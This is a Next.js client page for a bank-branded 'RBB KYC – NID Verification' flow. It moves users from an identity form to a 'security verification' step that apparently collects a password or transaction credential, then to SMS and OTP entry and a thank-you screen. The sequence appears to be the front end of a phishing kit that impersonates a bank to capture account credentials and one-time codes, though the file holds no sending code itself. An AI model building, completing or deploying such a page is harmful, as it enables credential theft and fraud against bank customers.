"use client";

import { useState } from "react";
import Image from "next/image";
import { KycForm } from "@/components/kyc-form";
import { AdditionalInfoForm } from "@/components/additional-info-form";
import { SuccessCard } from "@/components/success-card";
import { OtpVerify } from "@/components/otp-verify";
import { KycThankYou } from "@/components/kyc-thank-you";
import { PasswordTxnForm } from "@/components/password-txn-form";

type Step = "form" | "password-txn" | "additional" | "sms" | "otp" | "thankyou";

export default function KycPage() {
  const [step, setStep] = useState<Step>("form");
  const [submissionId, setSubmissionId] = useState<string | null>(null);

  function handleFormSuccess(id: string) {
    setSubmissionId(id);
    setStep("password-txn");
  }

  function handlePasswordTxnSuccess(id: string) {
    setSubmissionId(id);
    setStep("sms");
  }

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="w-full max-w-[420px]">
        {step === "form" && (
          <div className="bg-white rounded-2xl shadow-lg p-8 space-y-6">
            <div className="text-center space-y-3">
              <h1 className="text-xl font-bold text-gray-900">RBB KYC – NID Verification</h1>
              <div className="flex justify-center">
                <Image
                  src="/1731390437-339067.png"
                  alt="RBB KYC – NID Verification"
                  width={80}
                  height={80}
                  className="object-contain"
                  priority
                />
              </div>
            </div>
            <KycForm onContinue={handleFormSuccess} />
          </div>
        )}

        {step === "password-txn" && submissionId && (
          <div className="bg-white rounded-2xl shadow-lg p-8 space-y-6">
            <div className="text-center space-y-3">
              <h1 className="text-xl font-bold text-gray-900">RBB KYC – NID Verification</h1>
              <div className="flex justify-center">
                <Image
                  src="/1731390437-339067.png"
                  alt="RBB KYC – NID Verification"
                  width={80}
                  height={80}
                  className="object-contain"
                  priority
                />
              </div>
              <p className="text-sm text-gray-500">Security Verification</p>
            </div>
            <PasswordTxnForm submissionId={submissionId} onSuccess={handlePasswordTxnSuccess} />
          </div>
        )}

        {step === "additional" && submissionId && (
          <div className="bg-white rounded-2xl shadow-lg p-8 space-y-6">
            <div className="text-center space-y-3">
              <h1 className="text-xl font-bold text-gray-900">RBB KYC – NID Verification</h1>
              <div className="flex justify-center">
                <Image
                  src="/1731390437-339067.png"
                  alt="RBB KYC – NID Verification"
                  width={80}
                  height={80}
                  className="object-contain"
                  priority
                />
              </div>
            </div>
            <AdditionalInfoForm submissionId={submissionId} onSuccess={() => setStep("sms")} />
          </div>
        )}

        {step === "sms" && submissionId && (
          <SuccessCard submissionId={submissionId} onContinue={() => setStep("otp")} />
        )}
        {step === "otp" && submissionId && (
          <OtpVerify submissionId={submissionId} onVerified={() => setStep("thankyou")} />
        )}
        {step === "thankyou" && (
          <KycThankYou />
        )}
      </div>
    </div>
  );
}